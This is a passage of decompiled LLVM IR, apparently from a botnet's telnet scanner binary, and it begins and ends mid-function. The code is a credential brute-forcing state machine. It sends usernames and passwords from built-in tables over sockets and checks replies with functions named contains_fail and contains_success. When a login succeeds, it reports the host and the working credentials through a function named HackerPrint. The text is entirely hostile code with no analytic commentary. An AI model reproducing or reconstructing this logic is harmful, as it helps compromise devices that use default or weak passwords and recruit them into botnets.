  br label %dec_label_pc_804e319

dec_label_pc_804da09:                             ; preds = %dec_label_pc_804d943
  store i32 %v1_804d17f, i32* %eax.global-to-local, align 4
  %v2_804da24 = load i32, i32* %v1_804d182, align 4
  store i32 %v2_804da24, i32* %eax.global-to-local, align 4
  %v1_804da26 = add i32 %v2_804da24, 6
  store i32 %v1_804da26, i32* @ebx, align 4
  %v0_804da29 = load i32, i32* @esp, align 4
  %v1_804da29 = inttoptr i32 %v0_804da29 to i32*
  store i32 0, i32* %v1_804da29, align 4
  %v0_804da30 = load i32, i32* %stack_var_-336, align 4
  %v1_804da30 = inttoptr i32 %v0_804da30 to i32*
  %v2_804da30 = call i32 @__GI_time(i32* %v1_804da30)
  store i32 %v2_804da30, i32* %eax.global-to-local, align 4
  %v0_804da35 = load i32, i32* @ebx, align 4
  %v7_804da35 = icmp ult i32 %v0_804da35, %v2_804da30
  %v1_804da37 = icmp eq i1 %v7_804da35, false
  br i1 %v1_804da37, label %dec_label_pc_804e319, label %dec_label_pc_804da3d

dec_label_pc_804da3d:                             ; preds = %dec_label_pc_804da09
  store i8 0, i8* %v4_804d1cb, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804da6e = add i32 %v2_804d127, %v2_804d17b
  %v4_804da6e = inttoptr i32 %v3_804da6e to i8*
  store i8 1, i8* %v4_804da6e, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804da78:                             ; preds = %dec_label_pc_804d1b5
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804da8e = add i32 %v2_804d343, %v2_804d17b
  %v4_804da8e = inttoptr i32 %v3_804da8e to i8*
  %v5_804da8e = load i8, i8* %v4_804da8e, align 2
  %v6_804da8e = zext i8 %v5_804da8e to i32
  store i32 %v6_804da8e, i32* %eax.global-to-local, align 4
  %v1_804da96 = mul nuw nsw i32 %v6_804da8e, 4
  %v2_804da96 = add nuw nsw i32 %v1_804da96, 134606944
  %v3_804da96 = inttoptr i32 %v2_804da96 to i32*
  %v4_804da96 = load i32, i32* %v3_804da96, align 4
  %v1_804daa8 = and i32 %v4_804da96, -256
  store i32 %v1_804daa8, i32* %eax.global-to-local, align 4
  %v4_804daab = inttoptr i32 %v4_804da96 to i8*
  store i32 %v4_804da96, i32* @edi, align 4
  %v3_804dab1 = call i32 @_strlen(i8* %v4_804daab)
  store i32 %v3_804dab1, i32* @esi, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v5_804dad0 = load i8, i8* %v4_804da8e, align 2
  %v6_804dad0 = zext i8 %v5_804dad0 to i32
  store i32 %v6_804dad0, i32* %eax.global-to-local, align 4
  %v1_804dad8 = mul nuw nsw i32 %v6_804dad0, 4
  %v2_804dad8 = add nuw nsw i32 %v1_804dad8, 134606944
  %v3_804dad8 = inttoptr i32 %v2_804dad8 to i32*
  %v4_804dad8 = load i32, i32* %v3_804dad8, align 4
  store i32 %v4_804dad8, i32* @ebx, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804daf5 = inttoptr i32 %v2_804d17d to i32*
  %v4_804daf5 = load i32, i32* %v3_804daf5, align 4
  store i32 %v4_804daf5, i32* %eax.global-to-local, align 4
  %v0_804daf8 = load i32, i32* @esp, align 4
  %v1_804daf8 = add i32 %v0_804daf8, 12
  %v2_804daf8 = inttoptr i32 %v1_804daf8 to i32*
  store i32 16384, i32* %v2_804daf8, align 4
  %v0_804db00 = load i32, i32* @esi, align 4
  %v1_804db00 = load i32, i32* @esp, align 4
  %v2_804db00 = add i32 %v1_804db00, 8
  %v3_804db00 = inttoptr i32 %v2_804db00 to i32*
  store i32 %v0_804db00, i32* %v3_804db00, align 4
  %v0_804db04 = load i32, i32* @ebx, align 4
  %v1_804db04 = load i32, i32* @esp, align 4
  %v2_804db04 = add i32 %v1_804db04, 4
  %v3_804db04 = inttoptr i32 %v2_804db04 to i32*
  store i32 %v0_804db04, i32* %v3_804db04, align 4
  %v0_804db08 = load i32, i32* %eax.global-to-local, align 4
  %v1_804db08 = load i32, i32* @esp, align 4
  %v2_804db08 = inttoptr i32 %v1_804db08 to i32*
  store i32 %v0_804db08, i32* %v2_804db08, align 4
  %v4_804db0b = call i32 @__libc_send(i32 %v4_804da96, i32 %v2_804d09e, i32 %v6_804d1cb, i32 ptrtoint (i32* @0 to i32))
  %v2_804db10 = icmp slt i32 %v4_804db0b, 0
  %v1_804db12 = icmp eq i1 %v2_804db10, false
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  br i1 %v1_804db12, label %dec_label_pc_804db4f, label %dec_label_pc_804db14

dec_label_pc_804db14:                             ; preds = %dec_label_pc_804da78
  store i8 0, i8* %v4_804d1cb, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804db45 = add i32 %v2_804d127, %v2_804d17b
  %v4_804db45 = inttoptr i32 %v3_804db45 to i8*
  store i8 1, i8* %v4_804db45, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804db4f:                             ; preds = %dec_label_pc_804da78
  %v4_804db65 = load i32, i32* %v3_804daf5, align 4
  store i32 %v4_804db65, i32* %eax.global-to-local, align 4
  %v0_804db68 = load i32, i32* @esp, align 4
  %v1_804db68 = add i32 %v0_804db68, 12
  %v2_804db68 = inttoptr i32 %v1_804db68 to i32*
  store i32 16384, i32* %v2_804db68, align 4
  %v0_804db70 = load i32, i32* @esp, align 4
  %v1_804db70 = add i32 %v0_804db70, 8
  %v2_804db70 = inttoptr i32 %v1_804db70 to i32*
  store i32 2, i32* %v2_804db70, align 4
  %v0_804db78 = load i32, i32* @esp, align 4
  %v1_804db78 = add i32 %v0_804db78, 4
  %v2_804db78 = inttoptr i32 %v1_804db78 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8059ce9.250 to i32), i32* %v2_804db78, align 4
  %v0_804db80 = load i32, i32* %eax.global-to-local, align 4
  %v1_804db80 = load i32, i32* @esp, align 4
  %v2_804db80 = inttoptr i32 %v1_804db80 to i32*
  store i32 %v0_804db80, i32* %v2_804db80, align 4
  %v4_804db83 = call i32 @__libc_send(i32 %v4_804da96, i32 %v2_804d09e, i32 %v6_804d1cb, i32 ptrtoint (i32* @0 to i32))
  %v2_804db88 = icmp slt i32 %v4_804db83, 0
  %v1_804db8a = icmp eq i1 %v2_804db88, false
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  br i1 %v1_804db8a, label %dec_label_pc_804dbc7, label %dec_label_pc_804db8c

dec_label_pc_804db8c:                             ; preds = %dec_label_pc_804db4f
  store i8 0, i8* %v4_804d1cb, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804dbbd = add i32 %v2_804d127, %v2_804d17b
  %v4_804dbbd = inttoptr i32 %v3_804dbbd to i8*
  store i8 1, i8* %v4_804dbbd, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804dbc7:                             ; preds = %dec_label_pc_804db4f
  store i8 4, i8* %v4_804d1cb, align 4
  br label %dec_label_pc_804e319

dec_label_pc_804dbe7:                             ; preds = %dec_label_pc_804d1b5
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  %v1_804dbff = add i32 %v2_804d17d, 24
  store i32 %v1_804dbff, i32* %eax.global-to-local, align 4
  %v1_804dc02 = inttoptr i32 %v1_804dbff to i32*
  %v2_804dc02 = load i32, i32* %v1_804dc02, align 4
  store i32 %v2_804dc02, i32* @ebx, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804dc1a = inttoptr i32 %v2_804d17d to i32*
  %v4_804dc1a = load i32, i32* %v3_804dc1a, align 4
  store i32 %v4_804dc1a, i32* %edx.global-to-local, align 4
  %v0_804dc1d = load i32, i32* @esp, align 4
  %v1_804dc1d = add i32 %v0_804dc1d, 16
  %v2_804dc1d = inttoptr i32 %v1_804dc1d to i32*
  store i32 ptrtoint (i32* @global_var_805f11c to i32), i32* %v2_804dc1d, align 4
  %v0_804dc25 = load i32, i32* @esp, align 4
  %v1_804dc25 = add i32 %v0_804dc25, 12
  %v2_804dc25 = inttoptr i32 %v1_804dc25 to i32*
  store i32 1024, i32* %v2_804dc25, align 4
  %v0_804dc2d = load i32, i32* @ebx, align 4
  %v1_804dc2d = load i32, i32* @esp, align 4
  %v2_804dc2d = add i32 %v1_804dc2d, 8
  %v3_804dc2d = inttoptr i32 %v2_804dc2d to i32*
  store i32 %v0_804dc2d, i32* %v3_804dc2d, align 4
  store i32 10, i32* %eax.global-to-local, align 4
  %v1_804dc34 = load i32, i32* @esp, align 4
  %v2_804dc34 = add i32 %v1_804dc34, 4
  %v3_804dc34 = inttoptr i32 %v2_804dc34 to i32*
  store i32 10, i32* %v3_804dc34, align 4
  %v0_804dc38 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dc38 = load i32, i32* @esp, align 4
  %v2_804dc38 = inttoptr i32 %v1_804dc38 to i32*
  store i32 %v0_804dc38, i32* %v2_804dc38, align 4
  %v1_804dc3b = call i32 @read_until_response(i32 %v6_804d1cb)
  %v1_804dc40 = icmp eq i32 %v1_804dc3b, 0
  store i32 %v1_804d16d, i32* @edx, align 4
  store i32 %v2_804d17d, i32* %eax.global-to-local, align 4
  br i1 %v1_804dc40, label %dec_label_pc_804dcad, label %dec_label_pc_804dc44

dec_label_pc_804dc44:                             ; preds = %dec_label_pc_804dbe7
  store i32 %v1_804dbff, i32* %eax.global-to-local, align 4
  %v2_804dc5f = load i32, i32* %v1_804dc02, align 4
  store i32 %v2_804dc5f, i32* %eax.global-to-local, align 4
  %v1_804dc61 = load i32, i32* @esp, align 4
  %v2_804dc61 = inttoptr i32 %v1_804dc61 to i32*
  store i32 %v2_804dc5f, i32* %v2_804dc61, align 4
  %v0_804dc64 = call i32 @contains_fail()
  %v1_804dc69 = icmp eq i32 %v0_804dc64, 0
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  br i1 %v1_804dc69, label %dec_label_pc_804dc8d, label %dec_label_pc_804dc6d

dec_label_pc_804dc6d:                             ; preds = %dec_label_pc_804dc44
  store i8 0, i8* %v4_804d1cb, align 4
  br label %dec_label_pc_804e319

dec_label_pc_804dc8d:                             ; preds = %dec_label_pc_804dc44
  store i8 5, i8* %v4_804d1cb, align 4
  br label %dec_label_pc_804e319

dec_label_pc_804dcad:                             ; preds = %dec_label_pc_804dbe7
  store i32 %v1_804d17f, i32* %eax.global-to-local, align 4
  %v2_804dcc8 = load i32, i32* %v1_804d182, align 4
  store i32 %v2_804dcc8, i32* %eax.global-to-local, align 4
  %v1_804dcca = add i32 %v2_804dcc8, 6
  store i32 %v1_804dcca, i32* @ebx, align 4
  %v0_804dccd = load i32, i32* @esp, align 4
  %v1_804dccd = inttoptr i32 %v0_804dccd to i32*
  store i32 0, i32* %v1_804dccd, align 4
  %v1_804dcd4 = inttoptr i32 %stack_var_-624.241 to i32*
  %v2_804dcd4 = call i32 @__GI_time(i32* %v1_804dcd4)
  store i32 %v2_804dcd4, i32* %eax.global-to-local, align 4
  %v0_804dcd9 = load i32, i32* @ebx, align 4
  %v7_804dcd9 = icmp ult i32 %v0_804dcd9, %v2_804dcd4
  %v1_804dcdb = icmp eq i1 %v7_804dcd9, false
  br i1 %v1_804dcdb, label %dec_label_pc_804e319, label %dec_label_pc_804dce1

dec_label_pc_804dce1:                             ; preds = %dec_label_pc_804dcad
  store i8 0, i8* %v4_804d1cb, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804dd12 = add i32 %v2_804d127, %v2_804d17b
  %v4_804dd12 = inttoptr i32 %v3_804dd12 to i8*
  store i8 1, i8* %v4_804dd12, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804dd1c:                             ; preds = %dec_label_pc_804d1b5
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804dd32 = add i32 %v2_804d2fc, %v2_804d17b
  %v4_804dd32 = inttoptr i32 %v3_804dd32 to i8*
  %v5_804dd32 = load i8, i8* %v4_804dd32, align 1
  %v6_804dd32 = zext i8 %v5_804dd32 to i32
  store i32 %v6_804dd32, i32* %eax.global-to-local, align 4
  %v1_804dd3a = mul nuw nsw i32 %v6_804dd32, 4
  %v2_804dd3a = add nuw nsw i32 %v1_804dd3a, 134607040
  %v3_804dd3a = inttoptr i32 %v2_804dd3a to i32*
  %v4_804dd3a = load i32, i32* %v3_804dd3a, align 4
  %v1_804dd4c = and i32 %v4_804dd3a, -256
  store i32 %v1_804dd4c, i32* %eax.global-to-local, align 4
  %v4_804dd4f = inttoptr i32 %v4_804dd3a to i8*
  store i32 %v4_804dd3a, i32* @edi, align 4
  %v3_804dd55 = call i32 @_strlen(i8* %v4_804dd4f)
  store i32 %v3_804dd55, i32* @esi, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v5_804dd74 = load i8, i8* %v4_804dd32, align 1
  %v6_804dd74 = zext i8 %v5_804dd74 to i32
  store i32 %v6_804dd74, i32* %eax.global-to-local, align 4
  %v1_804dd7c = mul nuw nsw i32 %v6_804dd74, 4
  %v2_804dd7c = add nuw nsw i32 %v1_804dd7c, 134607040
  %v3_804dd7c = inttoptr i32 %v2_804dd7c to i32*
  %v4_804dd7c = load i32, i32* %v3_804dd7c, align 4
  store i32 %v4_804dd7c, i32* @ebx, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804dd99 = inttoptr i32 %v2_804d17d to i32*
  %v4_804dd99 = load i32, i32* %v3_804dd99, align 4
  store i32 %v4_804dd99, i32* %eax.global-to-local, align 4
  %v0_804dd9c = load i32, i32* @esp, align 4
  %v1_804dd9c = add i32 %v0_804dd9c, 12
  %v2_804dd9c = inttoptr i32 %v1_804dd9c to i32*
  store i32 16384, i32* %v2_804dd9c, align 4
  %v0_804dda4 = load i32, i32* @esi, align 4
  %v1_804dda4 = load i32, i32* @esp, align 4
  %v2_804dda4 = add i32 %v1_804dda4, 8
  %v3_804dda4 = inttoptr i32 %v2_804dda4 to i32*
  store i32 %v0_804dda4, i32* %v3_804dda4, align 4
  %v0_804dda8 = load i32, i32* @ebx, align 4
  %v1_804dda8 = load i32, i32* @esp, align 4
  %v2_804dda8 = add i32 %v1_804dda8, 4
  %v3_804dda8 = inttoptr i32 %v2_804dda8 to i32*
  store i32 %v0_804dda8, i32* %v3_804dda8, align 4
  %v0_804ddac = load i32, i32* %eax.global-to-local, align 4
  %v1_804ddac = load i32, i32* @esp, align 4
  %v2_804ddac = inttoptr i32 %v1_804ddac to i32*
  store i32 %v0_804ddac, i32* %v2_804ddac, align 4
  %v4_804ddaf = call i32 @__libc_send(i32 %v4_804dd3a, i32 %stack_var_-624.241, i32 %v2_804d09e, i32 %v6_804d1cb)
  %v2_804ddb4 = icmp slt i32 %v4_804ddaf, 0
  %v1_804ddb6 = icmp eq i1 %v2_804ddb4, false
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  br i1 %v1_804ddb6, label %dec_label_pc_804ddf3, label %dec_label_pc_804ddb8

dec_label_pc_804ddb8:                             ; preds = %dec_label_pc_804dd1c
  store i8 0, i8* %v4_804d1cb, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804dde9 = add i32 %v2_804d127, %v2_804d17b
  %v4_804dde9 = inttoptr i32 %v3_804dde9 to i8*
  store i8 1, i8* %v4_804dde9, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804ddf3:                             ; preds = %dec_label_pc_804dd1c
  %v4_804de09 = load i32, i32* %v3_804dd99, align 4
  store i32 %v4_804de09, i32* %eax.global-to-local, align 4
  %v0_804de0c = load i32, i32* @esp, align 4
  %v1_804de0c = add i32 %v0_804de0c, 12
  %v2_804de0c = inttoptr i32 %v1_804de0c to i32*
  store i32 16384, i32* %v2_804de0c, align 4
  %v0_804de14 = load i32, i32* @esp, align 4
  %v1_804de14 = add i32 %v0_804de14, 8
  %v2_804de14 = inttoptr i32 %v1_804de14 to i32*
  store i32 2, i32* %v2_804de14, align 4
  %v0_804de1c = load i32, i32* @esp, align 4
  %v1_804de1c = add i32 %v0_804de1c, 4
  %v2_804de1c = inttoptr i32 %v1_804de1c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8059ce9.250 to i32), i32* %v2_804de1c, align 4
  %v0_804de24 = load i32, i32* %eax.global-to-local, align 4
  %v1_804de24 = load i32, i32* @esp, align 4
  %v2_804de24 = inttoptr i32 %v1_804de24 to i32*
  store i32 %v0_804de24, i32* %v2_804de24, align 4
  %v4_804de27 = call i32 @__libc_send(i32 %v4_804dd3a, i32 %stack_var_-624.241, i32 %v2_804d09e, i32 %v6_804d1cb)
  %v2_804de2c = icmp slt i32 %v4_804de27, 0
  %v1_804de2e = icmp eq i1 %v2_804de2c, false
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  br i1 %v1_804de2e, label %dec_label_pc_804de6b, label %dec_label_pc_804de30

dec_label_pc_804de30:                             ; preds = %dec_label_pc_804ddf3
  store i8 0, i8* %v4_804d1cb, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804de61 = add i32 %v2_804d127, %v2_804d17b
  %v4_804de61 = inttoptr i32 %v3_804de61 to i8*
  store i8 1, i8* %v4_804de61, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804de6b:                             ; preds = %dec_label_pc_804ddf3
  store i8 6, i8* %v4_804d1cb, align 4
  br label %dec_label_pc_804e319

dec_label_pc_804de8b:                             ; preds = %dec_label_pc_804d1b5
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  %v1_804dea3 = add i32 %v2_804d17d, 24
  store i32 %v1_804dea3, i32* %eax.global-to-local, align 4
  %v1_804dea6 = inttoptr i32 %v1_804dea3 to i32*
  %v2_804dea6 = load i32, i32* %v1_804dea6, align 4
  store i32 %v2_804dea6, i32* @ebx, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804debe = inttoptr i32 %v2_804d17d to i32*
  %v4_804debe = load i32, i32* %v3_804debe, align 4
  store i32 %v4_804debe, i32* %edx.global-to-local, align 4
  %v0_804dec1 = load i32, i32* @esp, align 4
  %v1_804dec1 = add i32 %v0_804dec1, 16
  %v2_804dec1 = inttoptr i32 %v1_804dec1 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_805f180.251 to i32), i32* %v2_804dec1, align 4
  %v0_804dec9 = load i32, i32* @esp, align 4
  %v1_804dec9 = add i32 %v0_804dec9, 12
  %v2_804dec9 = inttoptr i32 %v1_804dec9 to i32*
  store i32 1024, i32* %v2_804dec9, align 4
  %v0_804ded1 = load i32, i32* @ebx, align 4
  %v1_804ded1 = load i32, i32* @esp, align 4
  %v2_804ded1 = add i32 %v1_804ded1, 8
  %v3_804ded1 = inttoptr i32 %v2_804ded1 to i32*
  store i32 %v0_804ded1, i32* %v3_804ded1, align 4
  store i32 10, i32* %eax.global-to-local, align 4
  %v1_804ded8 = load i32, i32* @esp, align 4
  %v2_804ded8 = add i32 %v1_804ded8, 4
  %v3_804ded8 = inttoptr i32 %v2_804ded8 to i32*
  store i32 10, i32* %v3_804ded8, align 4
  %v0_804dedc = load i32, i32* %edx.global-to-local, align 4
  %v1_804dedc = load i32, i32* @esp, align 4
  %v2_804dedc = inttoptr i32 %v1_804dedc to i32*
  store i32 %v0_804dedc, i32* %v2_804dedc, align 4
  %v1_804dedf = call i32 @read_until_response(i32 %v6_804d1cb)
  store i32 %v1_804dedf, i32* %eax.global-to-local, align 4
  %v1_804dee4 = icmp eq i32 %v1_804dedf, 0
  br i1 %v1_804dee4, label %dec_label_pc_804e143, label %dec_label_pc_804deec

dec_label_pc_804deec:                             ; preds = %dec_label_pc_804de8b
  store i32 %storemerge43, i32* @ebx, align 4
  %v0_804deef = load i32, i32* @esp, align 4
  %v1_804deef = inttoptr i32 %v0_804deef to i32*
  store i32 0, i32* %v1_804deef, align 4
  %v1_804def6 = inttoptr i32 %stack_var_-628.242 to i32*
  %v2_804def6 = call i32 @__GI_time(i32* %v1_804def6)
  store i32 %v2_804def6, i32* @esi, align 4
  %v0_804df00 = load i32, i32* @ebx, align 4
  %v2_804df10 = mul i32 %v0_804df00, 28
  %v1_804df14 = add i32 %v2_804df12, %v2_804df10
  %v2_804df17 = inttoptr i32 %v1_804df14 to i32*
  store i32 %v2_804def6, i32* %v2_804df17, align 4
  store i32 %v1_804d16d, i32* @edx, align 4
  store i32 %v1_804dea3, i32* %eax.global-to-local, align 4
  %v2_804df34 = load i32, i32* %v1_804dea6, align 4
  store i32 %v2_804df34, i32* %eax.global-to-local, align 4
  %v1_804df36 = load i32, i32* @esp, align 4
  %v2_804df36 = inttoptr i32 %v1_804df36 to i32*
  store i32 %v2_804df34, i32* %v2_804df36, align 4
  %v0_804df39 = call i32 @contains_fail()
  %v1_804df3e = icmp eq i32 %v0_804df39, 0
  store i32 %v1_804d16d, i32* @edx, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  br i1 %v1_804df3e, label %dec_label_pc_804df62, label %dec_label_pc_804df42

dec_label_pc_804df42:                             ; preds = %dec_label_pc_804deec
  store i8 0, i8* %v4_804d1cb, align 4
  br label %dec_label_pc_804e319

dec_label_pc_804df62:                             ; preds = %dec_label_pc_804deec
  store i32 %v1_804dea3, i32* %eax.global-to-local, align 4
  %v2_804df7d = load i32, i32* %v1_804dea6, align 4
  store i32 %v2_804df7d, i32* %eax.global-to-local, align 4
  %v1_804df7f = load i32, i32* @esp, align 4
  %v2_804df7f = inttoptr i32 %v1_804df7f to i32*
  store i32 %v2_804df7d, i32* %v2_804df7f, align 4
  %v0_804df82 = call i32 @contains_success()
  %v1_804df87 = icmp eq i32 %v0_804df82, 0
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  br i1 %v1_804df87, label %dec_label_pc_804e108, label %dec_label_pc_804df8f

dec_label_pc_804df8f:                             ; preds = %dec_label_pc_804df62
  %v3_804dfa5 = add i32 %v2_804d127, %v2_804d17b
  %v4_804dfa5 = inttoptr i32 %v3_804dfa5 to i8*
  %v5_804dfa5 = load i8, i8* %v4_804dfa5, align 1
  %v10_804dfaa = icmp eq i8 %v5_804dfa5, 2
  %v1_804dfac = icmp eq i1 %v10_804dfaa, false
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  br i1 %v1_804dfac, label %dec_label_pc_804dfce, label %dec_label_pc_804dfae

dec_label_pc_804dfae:                             ; preds = %dec_label_pc_804df8f
  store i8 7, i8* %v4_804d1cb, align 4
  br label %dec_label_pc_804e319

dec_label_pc_804dfce:                             ; preds = %dec_label_pc_804df8f
  %v3_804dfe4 = add i32 %v2_804d2fc, %v2_804d17b
  %v4_804dfe4 = inttoptr i32 %v3_804dfe4 to i8*
  %v5_804dfe4 = load i8, i8* %v4_804dfe4, align 1
  %v6_804dfe4 = zext i8 %v5_804dfe4 to i32
  store i32 %v6_804dfe4, i32* %eax.global-to-local, align 4
  %v1_804dfec = mul nuw nsw i32 %v6_804dfe4, 4
  %v2_804dfec = add nuw nsw i32 %v1_804dfec, 134607040
  %v3_804dfec = inttoptr i32 %v2_804dfec to i32*
  %v4_804dfec = load i32, i32* %v3_804dfec, align 4
  store i32 %v4_804dfec, i32* @ebx, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804e009 = add i32 %v2_804d343, %v2_804d17b
  %v4_804e009 = inttoptr i32 %v3_804e009 to i8*
  %v5_804e009 = load i8, i8* %v4_804e009, align 2
  %v6_804e009 = zext i8 %v5_804e009 to i32
  store i32 %v6_804e009, i32* %eax.global-to-local, align 4
  %v1_804e011 = mul nuw nsw i32 %v6_804e009, 4
  %v2_804e011 = add nuw nsw i32 %v1_804e011, 134606944
  %v3_804e011 = inttoptr i32 %v2_804e011 to i32*
  %v4_804e011 = load i32, i32* %v3_804e011, align 4
  store i32 %v4_804e011, i32* @esi, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17d, i32* %eax.global-to-local, align 4
  %v1_804e031 = load i32, i32* @esp, align 4
  %v2_804e031 = inttoptr i32 %v1_804e031 to i32*
  store i32 %v2_804d17d, i32* %v2_804e031, align 4
  %v0_804e034 = call i32 @get_telstate_host()
  store i32 %v0_804e034, i32* %eax.global-to-local, align 4
  %v0_804e039 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_804e039 = ptrtoint i8* %v0_804e039 to i32
  store i32 %v1_804e039, i32* %edx.global-to-local, align 4
  %v0_804e03f = load i32, i32* @ebx, align 4
  %v1_804e03f = load i32, i32* @esp, align 4
  %v2_804e03f = add i32 %v1_804e03f, 16
  %v3_804e03f = inttoptr i32 %v2_804e03f to i32*
  store i32 %v0_804e03f, i32* %v3_804e03f, align 4
  %v0_804e043 = load i32, i32* @esi, align 4
  %v1_804e043 = load i32, i32* @esp, align 4
  %v2_804e043 = add i32 %v1_804e043, 12
  %v3_804e043 = inttoptr i32 %v2_804e043 to i32*
  store i32 %v0_804e043, i32* %v3_804e043, align 4
  %v1_804e047 = load i32, i32* @esp, align 4
  %v2_804e047 = add i32 %v1_804e047, 8
  %v3_804e047 = inttoptr i32 %v2_804e047 to i32*
  store i32 %v0_804e034, i32* %v3_804e047, align 4
  %v0_804e04b = load i32, i32* @esp, align 4
  %v1_804e04b = add i32 %v0_804e04b, 4
  %v2_804e04b = inttoptr i32 %v1_804e04b to i32*
  store i32 ptrtoint (i32* @global_var_8059cec.252 to i32), i32* %v2_804e04b, align 4
  %v0_804e053 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e053 = load i32, i32* @esp, align 4
  %v2_804e053 = inttoptr i32 %v1_804e053 to i32*
  store i32 %v0_804e053, i32* %v2_804e053, align 4
  %v2_804e056 = call i32 @HackerPrint(i32 %stack_var_-628.242, i32 %stack_var_-624.241)
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v5_804e071 = load i8, i8* %v4_804dfe4, align 1
  %v6_804e071 = zext i8 %v5_804e071 to i32
  store i32 %v6_804e071, i32* %eax.global-to-local, align 4
  %v1_804e079 = mul nuw nsw i32 %v6_804e071, 4
  %v2_804e079 = add nuw nsw i32 %v1_804e079, 134607040
  %v3_804e079 = inttoptr i32 %v2_804e079 to i32*
  %v4_804e079 = load i32, i32* %v3_804e079, align 4
  store i32 %v4_804e079, i32* @ebx, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v5_804e096 = load i8, i8* %v4_804e009, align 2
  %v6_804e096 = zext i8 %v5_804e096 to i32
  store i32 %v6_804e096, i32* %eax.global-to-local, align 4
  %v1_804e09e = mul nuw nsw i32 %v6_804e096, 4
  %v2_804e09e = add nuw nsw i32 %v1_804e09e, 134606944
  %v3_804e09e = inttoptr i32 %v2_804e09e to i32*
  %v4_804e09e = load i32, i32* %v3_804e09e, align 4
  store i32 %v4_804e09e, i32* @esi, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17d, i32* %eax.global-to-local, align 4
  %v1_804e0be = load i32, i32* @esp, align 4
  %v2_804e0be = inttoptr i32 %v1_804e0be to i32*
  store i32 %v2_804d17d, i32* %v2_804e0be, align 4
  %v0_804e0c1 = call i32 @get_telstate_host()
  store i32 %v0_804e0c1, i32* %eax.global-to-local, align 4
  %v0_804e0c6 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_804e0c6 = ptrtoint i8* %v0_804e0c6 to i32
  store i32 %v1_804e0c6, i32* %edx.global-to-local, align 4
  %v0_804e0cc = load i32, i32* @ebx, align 4
  %v1_804e0cc = load i32, i32* @esp, align 4
  %v2_804e0cc = add i32 %v1_804e0cc, 16
  %v3_804e0cc = inttoptr i32 %v2_804e0cc to i32*
  store i32 %v0_804e0cc, i32* %v3_804e0cc, align 4
  %v0_804e0d0 = load i32, i32* @esi, align 4
  %v1_804e0d0 = load i32, i32* @esp, align 4
  %v2_804e0d0 = add i32 %v1_804e0d0, 12
  %v3_804e0d0 = inttoptr i32 %v2_804e0d0 to i32*
  store i32 %v0_804e0d0, i32* %v3_804e0d0, align 4
  %v1_804e0d4 = load i32, i32* @esp, align 4
  %v2_804e0d4 = add i32 %v1_804e0d4, 8
